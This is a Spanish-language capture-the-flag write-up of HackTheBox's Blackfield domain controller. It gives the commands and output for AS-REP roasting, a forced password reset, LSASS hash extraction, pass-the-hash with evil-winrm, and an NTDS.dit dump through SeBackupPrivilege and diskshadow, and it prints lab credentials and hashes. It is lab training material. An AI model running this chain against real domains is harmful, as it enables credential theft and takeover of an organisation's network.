# Writeup - Blackfield (HackTheBox)

**Máquina:** Blackfield  
**Plataforma:** HackTheBox  
**Sistema:** Windows Server 2019 (Domain Controller)  
**IP:** 10.10.10.192  
**Objetivo:** Obtener User.txt y Root.txt

## Resumen

Blackfield es una máquina Windows Domain Controller (DC) de dificultad Hard. El camino explota: enumeración SMB anónima, **AS-REP Roasting**, **ForceChangePassword** vía RPC, análisis forense de memoria **LSASS**, y **SeBackupPrivilege** para volcar el `NTDS.dit` completo del dominio.

---

## 1. Reconocimiento

### Nmap

```bash
nmap -p- --min-rate 10000 -oA nmap-alltcp 10.10.10.192
nmap -p 53,88,135,389,445,593,3268,5985 -sC -sV -oA nmap-tcpscripts 10.10.10.192
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds  (Domain: BLACKFIELD.local)
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP
3268/tcp open  globalcatLDAP
5985/tcp open  wsman         Microsoft HTTPAPI httpd 2.0
```

Confirmamos que es un DC con hostname `DC01` y dominio `BLACKFIELD.local`.

### SMB — Guest/Null Access

Con `smbmap` o `smbclient` sin credenciales:

```bash
smbmap -H 10.10.10.192 -u null
```

```
profiles$   READ ONLY
forensic    NO ACCESS
```

El share `profiles$` es accesible y contiene cientos de directorios vacíos con nombres de usuario:

```bash
smbclient -N //10.10.10.192/profiles$
smb: \> ls
  AAlleni                             D        0  ...
  ABarteski                           D        0  ...
  audit2020                           D        0  ...
  support                             D        0  ...
  svc_backup                          D        0  ...
  ...
```

Los extraemos a una lista:

```bash
printf '%s\n' 'dir' | smbclient -N //10.10.10.192/profiles$ '' 2>/dev/null | sed '1,3d;$d' | cut -d ' ' -f 3 -s > users.txt
```

---

## 2. AS-REP Roasting → Usuario `support`

Con `GetNPUsers.py` probamos cada usuario de la lista para encontrar cuentas con pre-autenticación deshabilitada:

```bash
for user in $(cat users.txt); do
  GetNPUsers.py -no-pass -dc-ip 10.10.10.192 "blackfield.local/$user" 2>/dev/null | grep krb5asrep
done
```

Obtenemos un hash para `support`:

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:83f2522...f0fcd94$0f355b4a...#00^BlackKnight
```

Lo crackeamos con `hashcat`:

```bash
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt --force
```

**Credenciales: `support:#00^BlackKnight`**

---

## 3. ForceChangePassword → Usuario `audit2020`

Con las creds de `support` ejecutamos `bloodhound-python` para mapear permisos en el dominio:

```bash
bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192
```

BloodHound revela que `support` tiene **ForceChangePassword** sobre `AUDIT2020`.

Cambiamos su password por RPC:

```bash
rpcclient -U 'BLACKFIELD.local/support%#00^BlackKnight' 10.10.10.192
rpcclient $> setuserinfo2 audit2020 23 'Password123!'
```

Verificamos:

```bash
crackmapexec smb 10.10.10.192 -u audit2020 -p 'Password123!'
```

---

## 4. Forensic Share → LSASS dump → `svc_backup`

Como `audit2020` ahora tenemos acceso al share `forensic`:

```bash
smbmap -H 10.10.10.192 -u audit2020 -p 'Password123!'
```

```
forensic    READ ONLY
```

Dentro hay análisis forense con dumps de memoria:

```
memory_analysis/
├── lsass.zip          # 42 MB
├── conhost.zip
├── svchost.zip
└── ...
```

Descargamos `lsass.zip`, lo descomprimimos y extraemos los hashes con `pypykatz`:

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

```
== LogonSession ==
username svc_backup
domainname BLACKFIELD
NT: 9658d1d1dcd9250115e2205d9f48400d
```

**NT hash de `svc_backup`: `9658d1d1dcd9250115e2205d9f48400d`**

Probamos acceso WinRM:

```bash
crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

`(Pwn3d!)`

Obtenemos shell:

```bash
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

```
*Evil-WinRM* PS C:\Users\svc_backup\desktop> cat user.txt
0b81b5d1************************
```

---

## 5. SeBackupPrivilege → NTDS.dit → Administrador

### Enumeración de privilegios

```powershell
whoami /priv
```

```
SeBackupPrivilege        Back up files and directories  Enabled
SeRestorePrivilege       Restore files and directories  Enabled
```

`svc_backup` pertenece al grupo **Backup Operators**, lo que permite leer cualquier archivo del sistema usando backup semantics.

### Shadow Copy expuesto como unidad

Creamos el script de `diskshadow` directamente desde PowerShell (sin subir archivos, sin `unix2dos`):

```powershell
@"
set context persistent nowriters
set metadata C:\programdata\df.cab
add volume c: alias df
create
expose %df% z:
"@ | Out-File -Encoding ascii C:\programdata\vss.dsh

diskshadow /s C:\programdata\vss.dsh
```

Esto expone el shadow copy como `Z:\`.

### Copiar NTDS.dit y SYSTEM

`robocopy /b` usa backup semantics para saltar permisos NTFS:

```cmd
robocopy /b z:\Windows\NTDS C:\programdata NTDS.dit
reg save hklm\system C:\programdata\system
```

### Exfiltración por `download` de evil-winrm

```powershell
download C:\programdata\ntds.dit
download C:\programdata\system
```

### Dump de hashes del dominio

```bash
secretsdump.py -ntds ntds.dit -system system LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
svc_backup:...
support:...
...
```

### Pass-the-Hash → Administrator

```bash
evil-winrm -i 10.10.10.192 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4375a629************************
```

---

## Resumen de la cadena de ataque

| Paso | Técnica | Resultado |
|-------|---------|-----------|
| 1 | SMB null session → `profiles$` | Lista de usuarios del dominio |
| 2 | AS-REP Roasting | `support:#00^BlackKnight` |
| 3 | Bloodhound + ForceChangePassword vía RPC | Cambiamos password de `audit2020` |
| 4 | SMB `forensic` share → LSASS dump | NT hash de `svc_backup` |
| 5 | Pass-the-hash WinRM | Shell como `svc_backup` + `user.txt` |
| 6 | SeBackupPrivilege + Shadow Copy | Copia de `NTDS.dit` |
| 7 | secretsdump + Pass-the-hash | Shell como `Administrator` + `root.txt` |
